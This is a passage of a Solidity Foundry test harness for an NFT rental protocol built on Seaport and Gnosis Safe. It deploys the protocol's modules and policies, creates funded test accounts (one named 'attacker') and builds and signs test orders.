vm.prank(deployer.addr);\n            STORE = Storage(create2Deployer.deploy(salt, storageProxyInitCode));\n\n            // label the contracts\n            vm.label(address(STORE), \"STORE\");\n            vm.label(address(storageImplementation), \"STORE_IMPLEMENTATION\");\n        }\n\n        function _deployPaymentEscrowModule() internal {\n            // abi encode the payment escrow bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory paymentEscrowImplementationInitCode = abi.encodePacked(\n                type(PaymentEscrow).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy payment escrow implementation contract\n            vm.prank(deployer.addr);\n            paymentEscrowImplementation = PaymentEscrow(\n                create2Deployer.deploy(salt, paymentEscrowImplementationInitCode)\n            );\n\n            // abi encode the payment escrow bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory paymentEscrowProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(paymentEscrowImplementation),\n                    abi.encodeWithSelector(\n                        PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy payment escrow contract\n            vm.prank(deployer.addr);\n            ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));\n\n            // label the contracts\n            vm.label(address(ESCRW), \"ESCRW\");\n            vm.label(address(paymentEscrowImplementation), \"ESCRW_IMPLEMENTATION\");\n        }\n\n        function _deployCreatePolicy() internal {\n            // abi encode the create policy bytecode and constructor arguments\n            bytes memory createInitCode = abi.encodePacked(\n                type(Create).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy create rental policy contract\n            vm.prank(deployer.addr);\n            create = Create(create2Deployer.deploy(salt, createInitCode));\n\n            // label the contract\n            vm.label(address(create), \"CreatePolicy\");\n        }\n\n        function _deployStopPolicy() internal {\n            // abi encode the stop policy bytecode and constructor arguments\n            bytes memory stopInitCode = abi.encodePacked(\n                type(Stop).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy stop rental policy contract\n            vm.prank(deployer.addr);\n            stop = Stop(create2Deployer.deploy(salt, stopInitCode));\n\n            // label the contract\n            vm.label(address(stop), \"StopPolicy\");\n        }\n\n        function _deployAdminPolicy() internal {\n            // abi encode the admin policy bytecode and constructor arguments\n            bytes memory adminInitCode = abi.encodePacked(\n                type(Admin).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy admin policy contract\n            vm.prank(deployer.addr);\n            admin = Admin(create2Deployer.deploy(salt, adminInitCode));\n\n            // label the contract\n            vm.label(address(admin), \"AdminPolicy\");\n        }\n\n        function _deployGuardPolicy() internal {\n            // abi encode the guard policy bytecode and constructor arguments\n            bytes memory guardInitCode = abi.encodePacked(\n                type(Guard).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy guard policy contract\n            vm.prank(deployer.addr);\n            guard = Guard(create2Deployer.deploy(salt, guardInitCode));\n\n            // label the contract\n            vm.label(address(guard), \"GuardPolicy\");\n        }\n\n        function _deployFactoryPolicy() internal {\n            // abi encode the factory policy bytecode and constructor arguments\n            bytes memory factoryInitCode = abi.encodePacked(\n                type(Factory).creationCode,\n                abi.encode(\n                    address(kernel),\n                    address(stop),\n                    address(guard),\n                    address(tokenCallbackHandler),\n                    address(safeProxyFactory),\n                    address(safeSingleton)\n                )\n            );\n\n            // Deploy factory policy contract\n            vm.prank(deployer.addr);\n            factory = Factory(create2Deployer.deploy(salt, factoryInitCode));\n\n            // label the contract\n            vm.label(address(factory), \"FactoryPolicy\");\n        }\n\n        function _setupKernel() internal {\n            // Start impersonating the deployer\n            vm.startPrank(deployer.addr);\n\n            // Install modules\n            kernel.executeAction(Actions.InstallModule, address(STORE));\n            kernel.executeAction(Actions.InstallModule, address(ESCRW));\n\n            // Approve policies\n            kernel.executeAction(Actions.ActivatePolicy, address(create));\n            kernel.executeAction(Actions.ActivatePolicy, address(stop));\n            kernel.executeAction(Actions.ActivatePolicy, address(factory));\n            kernel.executeAction(Actions.ActivatePolicy, address(guard));\n            kernel.executeAction(Actions.ActivatePolicy, address(admin));\n\n            // Grant `seaport` role to seaport protocol\n            kernel.grantRole(toRole(\"SEAPORT\"), address(seaport));\n\n            // Grant `signer` role to the protocol signer to sign off on create payloads\n            kernel.grantRole(toRole(\"CREATE_SIGNER\"), rentalSigner.addr);\n\n            // Grant 'admin_admin` role to the address which can conduct admin operations on the protocol\n            kernel.grantRole(toRole(\"ADMIN_ADMIN\"), deployer.addr);\n\n            // Grant 'guard_admin` role to the address which can toggle hooks\n            kernel.grantRole(toRole(\"GUARD_ADMIN\"), deployer.addr);\n\n            // Grant `stop_admin` role to the address which can skim funds from the payment escrow\n            kernel.grantRole(toRole(\"STOP_ADMIN\"), deployer.addr);\n\n            // Stop impersonating the deployer\n            vm.stopPrank();\n        }\n\n        function setUp() public virtual override {\n            // setup dependencies\n            super.setUp();\n\n            // create the rental signer address and private key\n            rentalSigner = vm.createWallet(\"rentalSigner\");\n\n            // create the deployer address and private key\n            deployer = vm.createWallet(\"deployer\");\n\n            // contract salts (using 0x000000000000000000000100 to represent a version 1.0.0 of each contract)\n            protocolVersion = 0x000000000000000000000100;\n            salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);\n\n            // deploy kernel\n            _deployKernel();\n\n            // Deploy payment escrow\n            _deployPaymentEscrowModule();\n\n            // Deploy rental storage\n            _deployStorageModule();\n\n            // deploy create policy\n            _deployCreatePolicy();\n\n            // deploy stop policy\n            _deployStopPolicy();\n\n            // deploy admin policy\n            _deployAdminPolicy();\n\n            // Deploy guard policy\n            _deployGuardPolicy();\n\n            // deploy rental factory\n            _deployFactoryPolicy();\n\n            // intialize the kernel\n            _setupKernel();\n        }\n    }\n\n\n    // Creates test accounts to interact with the V3 protocol\n    // Borrowed from test/fixtures/protocol/AccountCreator\n    contract AccountCreator is Protocol {\n        // Protocol accounts for testing\n        ProtocolAccount public alice;\n        ProtocolAccount public bob;\n        ProtocolAccount public carol;\n        ProtocolAccount public dan;\n        ProtocolAccount public eve;\n        ProtocolAccount public attacker;\n\n        // Mock tokens for testing\n        MockERC20[] public erc20s;\n        MockERC721[] public erc721s;\n        MockERC1155[] public erc1155s;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // deploy 3 erc20 tokens, 3 erc721 tokens, and 3 erc1155 tokens\n            _deployTokens(3);\n\n            // instantiate all wallets and deploy rental safes for each\n            alice = _fundWalletAndDeployRentalSafe(\"alice\");\n            bob = _fundWalletAndDeployRentalSafe(\"bob\");\n            carol = _fundWalletAndDeployRentalSafe(\"carol\");\n            dan = _fundWalletAndDeployRentalSafe(\"dan\");\n            eve = _fundWalletAndDeployRentalSafe(\"eve\");\n            attacker = _fundWalletAndDeployRentalSafe(\"attacker\");\n\n\n\n        }\n\n        function _deployTokens(uint256 numTokens) internal {\n            for (uint256 i; i < numTokens; i++) {\n                _deployErc20Token();\n                _deployErc721Token();\n                _deployErc1155Token();\n            }\n        }\n\n        function _deployErc20Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc20s.length;\n\n            // deploy the mock token\n            MockERC20 token = new MockERC20();\n\n            // push the token to the array of mocks\n            erc20s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC20_\", LibString.toString(i)));\n        }\n\n        function _deployErc721Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc721s.length;\n\n            // deploy the mock token\n            MockERC721 token = new MockERC721();\n\n            // push the token to the array of mocks\n            erc721s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC721_\", LibString.toString(i)));\n        }\n\n        function _deployErc1155Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc1155s.length;\n\n            // deploy the mock token\n            MockERC1155 token = new MockERC1155();\n\n            // push the token to the array of mocks\n            erc1155s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC1155_\", LibString.toString(i)));\n        }\n\n        function _deployRentalSafe(\n            address owner,\n            string memory name\n        ) internal returns (address safe) {\n            // Deploy a 1/1 rental safe\n            address[] memory owners = new address[](1);\n            owners[0] = owner;\n            safe = factory.deployRentalSafe(owners, 1);\n\n\n\n        }\n\n        function _fundWalletAndDeployRentalSafe(\n            string memory name\n        ) internal returns (ProtocolAccount memory account) {\n            // create a wallet with a address, public key, and private key\n            Vm.Wallet memory wallet = vm.createWallet(name);\n\n            // deploy a rental safe for the address\n            address rentalSafe = _deployRentalSafe(wallet.addr, name);\n\n            // fund the wallet with ether, all erc20s, and approve the conduit for erc20s, erc721s, erc1155s\n            _allocateTokensAndApprovals(wallet.addr, 10000);\n\n            // create an account\n            account = ProtocolAccount({\n                addr: wallet.addr,\n                safe: SafeL2(payable(rentalSafe)),\n                publicKeyX: wallet.publicKeyX,\n                publicKeyY: wallet.publicKeyY,\n                privateKey: wallet.privateKey\n            });\n\n        }\n\n        function _allocateTokensAndApprovals(address to, uint128 amount) internal {\n            // deal ether to the recipient\n            vm.deal(to, amount);\n\n            // mint all erc20 tokens to the recipient\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].mint(to, amount);\n            }\n\n            // set token approvals\n            _setApprovals(to);\n        }\n\n        function _setApprovals(address owner) internal {\n            // impersonate the owner address\n            vm.startPrank(owner);\n\n            // set all approvals for erc20 tokens\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].approve(address(conduit), type(uint256).max);\n            }\n\n            // set all approvals for erc721 tokens\n            for (uint256 i = 0; i < erc721s.length; ++i) {\n                erc721s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // set all approvals for erc1155 tokens\n            for (uint256 i = 0; i < erc1155s.length; ++i) {\n                erc1155s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // stop impersonating\n            vm.stopPrank();\n        }\n    }\n\n\n\n    interface ERC1155TokenReceiver {\n\n        function onERC1155Received(\n            address _operator,\n            address _from,\n            uint256 _id,\n            uint256 _value,\n            bytes calldata _data\n        ) external returns (bytes4);\n\n        function onERC1155BatchReceived(\n            address _operator,\n            address _from,\n            uint256[] calldata _ids,\n            uint256[] calldata _values,\n            bytes calldata _data\n        ) external returns (bytes4);\n    }\n\n    interface ERC721TokenReceiver {\n        function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data) external returns (bytes4);\n    }\n\n    interface IERC165 {\n        function supportsInterface(bytes4 interfaceId) external view returns (bool);\n    }\n\n\n    /**\n    * Borrowed from gnosis safe smart contracts\n    * @title Default Callback Handler - Handles supported tokens' callbacks, allowing Safes receiving these tokens.\n    * @author Richard Meissner - @rmeissner\n    */\n    contract TokenCallbackHandler is ERC1155TokenReceiver, ERC721TokenReceiver, IERC165 {\n        /**\n        * @notice Handles ERC1155 Token callback.\n        * return Standardized onERC1155Received return value.\n        */\n        function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure override returns (bytes4) {\n            return 0xf23a6e61;\n        }\n\n        /**\n        * @notice Handles ERC1155 Token batch callback.\n        * return Standardized onERC1155BatchReceived return value.\n        */\n        function onERC1155BatchReceived(\n            address,\n            address,\n            uint256[] calldata,\n            uint256[] calldata,\n            bytes calldata\n        ) external pure override returns (bytes4) {\n            return 0xbc197c81;\n        }\n\n        /**\n        * @notice Handles ERC721 Token callback.\n        *  return Standardized onERC721Received return value.\n        */\n        function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {\n            return 0x150b7a02;\n        }\n\n        /**\n        * @notice Handles ERC777 Token callback.\n        * return nothing (not standardized)\n        */\n        function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external pure {\n            // We implement this for completeness, doesn't really have any value\n        }\n\n        /**\n        * @notice Implements ERC165 interface support for ERC1155TokenReceiver, ERC721TokenReceiver and IERC165.\n        * @param interfaceId Id of the interface.\n        * @return if the interface is supported.\n        */\n        function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {\n            return\n                interfaceId == type(ERC1155TokenReceiver).interfaceId ||\n                interfaceId == type(ERC721TokenReceiver).interfaceId ||\n                interfaceId == type(IERC165).interfaceId;\n        }\n\n    }\n\n\n\n    // Sets up logic in the test engine related to order creation\n    // Borrowed from test/fixtures/engine/OrderCreator\n    contract OrderCreator is AccountCreator {\n        using OfferItemLib for OfferItem;\n        using ConsiderationItemLib for ConsiderationItem;\n        using OrderComponentsLib for OrderComponents;\n        using OrderLib for Order;\n        using ECDSA for bytes32;\n\n        // defines a config for a standard order component\n        string constant STANDARD_ORDER_COMPONENTS = \"standard_order_components\";\n\n        struct OrderToCreate {\n            ProtocolAccount offerer;\n            OfferItem[] offerItems;\n            ConsiderationItem[] considerationItems;\n            OrderMetadata metadata;\n        }\n\n        // keeps track of tokens used during a test\n        uint256[] usedOfferERC721s;\n        uint256[] usedOfferERC1155s;\n\n        uint256[] usedConsiderationERC721s;\n        uint256[] usedConsiderationERC1155s;\n\n        // components of an order\n        OrderToCreate orderToCreate;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // Define a standard OrderComponents struct which is ready for\n            // use with the Create Policy and the protocol conduit contract\n            OrderComponentsLib\n                .empty()\n                .withOrderType(SeaportOrderType.FULL_RESTRICTED)\n                .withZone(address(create))\n                .withStartTime(block.timestamp)\n                .withEndTime(block.timestamp + 100)\n                .withSalt(123456789)\n                .withConduitKey(conduitKey)\n                .saveDefault(STANDARD_ORDER_COMPONENTS);\n\n            // for each test token, create a storage slot\n            for (uint256 i = 0; i < erc721s.length; i++) {\n                usedOfferERC721s.push();\n                usedConsiderationERC721s.push();\n\n                usedOfferERC1155s.push();\n                usedConsiderationERC1155s.push();\n            }\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                                Order Creation                               //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order based on the provided context. The defaults on this order\n        // are good for most test cases.\n        function createOrder(\n            ProtocolAccount memory offerer,\n            OrderType orderType,\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers,\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) internal {\n            // require that the number of offer items or consideration items\n            // dont exceed the number of test tokens\n            require(\n                erc721Offers <= erc721s.length &&\n                    erc721Offers <= erc1155s.length &&\n                    erc20Offers <= erc20s.length,\n                \"TEST: too many offer items defined\"\n            );\n            require(\n                erc721Considerations <= erc721s.length &&\n                    erc1155Considerations <= erc1155s.length &&\n                    erc20Considerations <= erc20s.length,\n                \"TEST: too many consideration items defined\"\n            );\n\n            // create the offerer\n            _createOfferer(offerer);\n\n            // add the offer items\n            _createOfferItems(erc721Offers, erc1155Offers, erc20Offers);\n\n            // create the consideration items\n            _createConsiderationItems(\n                erc721Considerations,\n                erc1155Considerations,\n                erc20Considerations\n            );\n\n            // Create order metadata\n            _createOrderMetadata(orderType);\n        }\n\n        // Creates an offerer on the order to create\n        function _createOfferer(ProtocolAccount memory offerer) private {\n            orderToCreate.offerer = offerer;\n        }\n\n        // Creates offer items which are good for most tests\n        function _createOfferItems(\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers\n        ) private {\n            // generate the ERC721 offer items\n            for (uint256 i = 0; i < erc721Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // mint an erc721 to the offerer\n                erc721s[i].mint(orderToCreate.offerer.addr);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC721s[i]++;\n            }\n\n            // generate the ERC1155 offer items\n            for (uint256 i = 0; i < erc1155Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // mint an erc1155 to the offerer\n                erc1155s[i].mint(orderToCreate.offerer.addr, 100);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC1155s[i]++;\n            }\n\n            // generate the ERC20 offer items\n            for (uint256 i = 0; i < erc20Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates consideration items that are good for most tests\n        function _createConsiderationItems(\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) private {\n            // generate the ERC721 consideration items\n            for (uint256 i = 0; i < erc721Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC721s[i]++;\n            }\n\n            // generate the ERC1155 consideration items\n            for (uint256 i = 0; i < erc1155Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC1155s[i]++;\n            }\n\n            // generate the ERC20 consideration items\n            for (uint256 i = 0; i < erc20Considerations; ++i) {\n                // create the offer item\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(ESCRW))\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates a order metadata that is good for most tests\n        function _createOrderMetadata(OrderType orderType) private {\n            // Create order metadata\n            orderToCreate.metadata.orderType = orderType;\n            orderToCreate.metadata.rentDuration = 500;\n            orderToCreate.metadata.emittedExtraData = new bytes(0);\n        }\n\n        // creates a signed seaport order ready to be fulfilled by a renter\n        function _createSignedOrder(\n            ProtocolAccount memory _offerer,\n            OfferItem[] memory _offerItems,\n            ConsiderationItem[] memory _considerationItems,\n            OrderMetadata memory _metadata\n        ) private view returns (Order memory order, bytes32 orderHash) {\n            // Build the order components\n            OrderComponents memory orderComponents = OrderComponentsLib\n                .fromDefault(STANDARD_ORDER_COMPONENTS)\n                .withOfferer(_offerer.addr)\n                .withOffer(_offerItems)\n                .withConsideration(_considerationItems)\n                .withZoneHash(create.getOrderMetadataHash(_metadata))\n                .withCounter(seaport.getCounter(_offerer.addr));\n\n            // generate the order hash\n            orderHash = seaport.getOrderHash(orderComponents);\n\n            // generate the signature for the order components\n            bytes memory signature = _signSeaportOrder(_offerer.privateKey, orderHash);\n\n            // create the order, but dont provide a signature if its a PAYEE order.\n            // Since PAYEE orders are fulfilled by the offerer of the order, they\n            // dont need a signature.\n            if (_metadata.orderType == OrderType.PAYEE) {\n                order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());\n            } else {\n                order = OrderLib\n                    .empty()\n                    .withParameters(orderComponents.toOrderParameters())\n                    .withSignature(signature);\n            }\n        }\n\n        function _signSeaportOrder(\n            uint256 signerPrivateKey,\n            bytes32 orderHash\n        ) private view returns (bytes memory signature) {\n            // fetch domain separator from seaport\n            (, bytes32 domainSeparator, ) = seaport.information();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(orderHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                               Order Amendments                              //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function resetOrderToCreate() internal {\n            delete orderToCreate;\n        }\n\n        function withOfferer(ProtocolAccount memory _offerer) internal {\n            orderToCreate.offerer = _offerer;\n        }\n\n        function resetOfferer() internal {\n            delete orderToCreate.offerer;\n        }\n\n        function withReplacedOfferItems(OfferItem[] memory _offerItems) internal {\n            // reset all current offer items\n            resetOfferItems();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < _offerItems.length; i++) {\n                orderToCreate.offerItems.push(_offerItems[i]);\n            }\n        }\n\n        function withOfferItem(OfferItem memory offerItem) internal {\n            orderToCreate.offerItems.push(offerItem);\n        }\n\n        function resetOfferItems() internal {\n            delete orderToCreate.offerItems;\n        }\n\n        function popOfferItem() internal {\n            orderToCreate.offerItems.pop();\n        }\n\n        function withReplacedConsiderationItems(\n            ConsiderationItem[] memory _considerationItems\n        ) internal {\n            // reset all current consideration items\n            resetConsiderationItems();\n\n            // add the new consideration items to storage\n            for (uint256 i = 0; i < _considerationItems.length; i++) {\n                orderToCreate.considerationItems.push(_considerationItems[i]);\n            }\n        }\n\n        function withConsiderationItem(ConsiderationItem memory considerationItem) internal {\n            orderToCreate.considerationItems.push(considerationItem);\n        }\n\n        function resetConsiderationItems() internal {\n            delete orderToCreate.considerationItems;\n        }\n\n        function popConsiderationItem() internal {\n            orderToCreate.considerationItems.pop();\n        }\n\n        function withHooks(Hook[] memory hooks) internal {\n            // delete the current metatdata hooks\n            delete orderToCreate.metadata.hooks;\n\n            // add each metadata hook to storage\n            for (uint256 i = 0; i < hooks.length; i++) {\n                orderToCreate.metadata.hooks.push(hooks[i]);\n            }\n        }\n\n        function withOrderMetadata(OrderMetadata memory _metadata) internal {\n            // update the static metadata parameters\n            orderToCreate.metadata.orderType = _metadata.orderType;\n            orderToCreate.metadata.rentDuration = _metadata.rentDuration;\n            orderToCreate.metadata.emittedExtraData = _metadata.emittedExtraData;\n\n            // update the hooks\n            withHooks(_metadata.hooks);\n        }\n\n        function resetOrderMetadata() internal {\n            delete orderToCreate.metadata;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                              Order Finalization                             //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function finalizeOrder()\n            internal\n            returns (Order memory, bytes32, OrderMetadata memory)\n        {\n            // create and sign the order\n            (Order memory order, bytes32 orderHash) = _createSignedOrder(\n                orderToCreate.offerer,\n                orderToCreate.offerItems,\n                orderToCreate.considerationItems,\n                orderToCreate.metadata\n            );\n\n            // pull order metadata into memory\n            OrderMetadata memory metadata = orderToCreate.metadata;\n\n            // clear structs\n            resetOrderToCreate();\n\n            return (order, orderHash, metadata);\n        }\n    }\n\n\n    // Sets up logic in the test engine related to order fulfillment\n    // Borrowed from test/fixtures/engine/OrderFulfiller\n    contract OrderFulfiller is OrderCreator {\n        using ECDSA for bytes32;\n\n        struct OrderToFulfill {\n            bytes32 orderHash;\n            RentPayload payload;\n            AdvancedOrder advancedOrder;\n        }\n\n        // components of a fulfillment\n        ProtocolAccount fulfiller;\n        OrderToFulfill[] ordersToFulfill;\n        Fulfillment[] seaportMatchOrderFulfillments;\n        FulfillmentComponent[][] seaportOfferFulfillments;\n        FulfillmentComponent[][] seaportConsiderationFulfillments;\n        address seaportRecipient;\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                             Fulfillment Creation                            //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order fulfillment\n        function createOrderFulfillment(\n            ProtocolAccount memory _fulfiller,\n            Order memory order,\n            bytes32 orderHash,\n            OrderMetadata memory metadata\n        ) internal {\n            // set the fulfiller account\n            fulfiller = _fulfiller;\n\n            // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via\n            // `matchAdvancedOrders`, then any unspent offer items will go to this address as well\n            seaportRecipient = address(_fulfiller.safe);\n\n            // get a pointer to a new order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill.push();\n\n            // create an order fulfillment\n            OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));\n\n            // add the order hash and fulfiller\n            orderToFulfill.orderHash = orderHash;\n\n            // create rental zone payload data\n            _createRentalPayload(\n                orderToFulfill.payload,\n                RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)\n            );\n\n            // generate the signature for the payload\n            bytes memory signature = _signProtocolOrder(\n                rentalSigner.privateKey,\n                create.getRentPayloadHash(orderToFulfill.payload)\n            );\n\n            // create an advanced order from the order. Pass the rental\n            // payload as extra data\n            _createAdvancedOrder(\n                orderToFulfill.advancedOrder,\n                AdvancedOrder(\n                    order.parameters,\n                    1,\n                    1,\n                    order.signature,\n                    abi.encode(orderToFulfill.payload, signature)\n                )\n            );\n        }\n\n        function _createOrderFulfiller(\n            ProtocolAccount storage storageFulfiller,\n            ProtocolAccount memory _fulfiller\n        ) private {\n            storageFulfiller.addr = _fulfiller.addr;\n            storageFulfiller.safe = _fulfiller.safe;\n            storageFulfiller.publicKeyX = _fulfiller.publicKeyX;\n            storageFulfiller.publicKeyY = _fulfiller.publicKeyY;\n            storageFulfiller.privateKey = _fulfiller.privateKey;\n        }\n\n        function _createOrderFulfillment(\n            OrderFulfillment storage storageFulfillment,\n            OrderFulfillment memory fulfillment\n        ) private {\n            storageFulfillment.recipient = fulfillment.recipient;\n        }\n\n        function _createOrderMetadata(\n            OrderMetadata storage storageMetadata,\n            OrderMetadata memory metadata\n        ) private {\n            // Create order metadata in storage\n            storageMetadata.orderType = metadata.orderType;\n            storageMetadata.rentDuration = metadata.rentDuration;\n            storageMetadata.emittedExtraData = metadata.emittedExtraData;\n\n            // dynamically push the hooks from memory to storage\n            for (uint256 i = 0; i < metadata.hooks.length; i++) {\n                storageMetadata.hooks.push(metadata.hooks[i]);\n            }\n        }\n\n        function _createRentalPayload(\n            RentPayload storage storagePayload,\n            RentPayload memory payload\n        ) private {\n            // set payload fulfillment on the order to fulfill\n            _createOrderFulfillment(storagePayload.fulfillment, payload.fulfillment);\n\n            // set payload metadata on the order to fulfill\n            _createOrderMetadata(storagePayload.metadata, payload.metadata);\n\n            // set payload expiration on the order to fulfill\n            storagePayload.expiration = payload.expiration;\n\n            // set payload intended fulfiller on the order to fulfill\n            storagePayload.intendedFulfiller = payload.intendedFulfiller;\n        }\n\n        function _createAdvancedOrder(\n            AdvancedOrder storage storageAdvancedOrder,\n            AdvancedOrder memory advancedOrder\n        ) private {\n            // create the order parameters on the order to fulfill\n            _createOrderParameters(storageAdvancedOrder.parameters, advancedOrder.parameters);\n\n            // create the rest of the static parameters on the order to fulfill\n            storageAdvancedOrder.numerator = advancedOrder.numerator;\n            storageAdvancedOrder.denominator = advancedOrder.denominator;\n            storageAdvancedOrder.signature = advancedOrder.signature;\n            storageAdvancedOrder.extraData = advancedOrder.extraData;\n        }\n\n        function _createOrderParameters(\n            OrderParameters storage storageOrderParameters,\n            OrderParameters memory orderParameters\n        ) private {\n            // create the static order parameters for the order to fulfill\n            storageOrderParameters.offerer = orderParameters.offerer;\n            storageOrderParameters.zone = orderParameters.zone;\n            storageOrderParameters.orderType = orderParameters.orderType;\n            storageOrderParameters.startTime = orderParameters.startTime;\n            storageOrderParameters.endTime = orderParameters.endTime;\n            storageOrderParameters.zoneHash = orderParameters.zoneHash;\n            storageOrderParameters.salt = orderParameters.salt;\n            storageOrderParameters.conduitKey = orderParameters.conduitKey;\n            storageOrderParameters.totalOriginalConsiderationItems = orderParameters\n                .totalOriginalConsiderationItems;\n\n            // create the dynamic order parameters for the order to fulfill\n            for (uint256 i = 0; i < orderParameters.offer.length; i++) {\n                storageOrderParameters.offer.push(orderParameters.offer[i]);\n            }\n            for (uint256 i = 0; i < orderParameters.consideration.length; i++) {\n                storageOrderParameters.consideration.push(orderParameters.consideration[i]);\n            }\n        }\n\n        function _createSeaportFulfillment(\n            Fulfillment storage storageFulfillment,\n            Fulfillment memory fulfillment\n        ) private {\n            // push the offer components to storage\n            for (uint256 i = 0; i < fulfillment.offerComponents.length; i++) {\n                storageFulfillment.offerComponents.push(fulfillment.offerComponents[i]);\n            }\n\n            // push the consideration components to storage\n            for (uint256 i = 0; i < fulfillment.considerationComponents.length; i++) {\n                storageFulfillment.considerationComponents.push(\n                    fulfillment.considerationComponents[i]\n                );\n            }\n        }\n\n        function _seaportItemTypeToRentalItemType(\n            SeaportItemType seaportItemType\n        ) internal pure returns (RentalItemType) {\n            if (seaportItemType == SeaportItemType.ERC20) {\n                return RentalItemType.ERC20;\n            } else if (seaportItemType == SeaportItemType.ERC721) {\n                return RentalItemType.ERC721;\n            } else if (seaportItemType == SeaportItemType.ERC1155) {\n                return RentalItemType.ERC1155;\n            } else {\n                revert(\"seaport item type not supported\");\n            }\n        }\n\n        function _createRentalOrder(\n            OrderToFulfill memory orderToFulfill\n        ) internal view returns (RentalOrder memory rentalOrder) {\n            // get the order parameters\n            OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;\n\n            // get the payload\n            RentPayload memory payload = orderToFulfill.payload;\n\n            // get the metadata\n            OrderMetadata memory metadata = payload.metadata;\n\n            // construct a rental order\n            rentalOrder = RentalOrder({\n                seaportOrderHash: orderToFulfill.orderHash,\n                items: new Item[](parameters.offer.length + parameters.consideration.length),\n                hooks: metadata.hooks,\n                orderType: metadata.orderType,\n                lender: parameters.offerer,\n                renter: payload.intendedFulfiller,\n                rentalWallet: payload.fulfillment.recipient,\n                startTimestamp: block.timestamp,\n                endTimestamp: 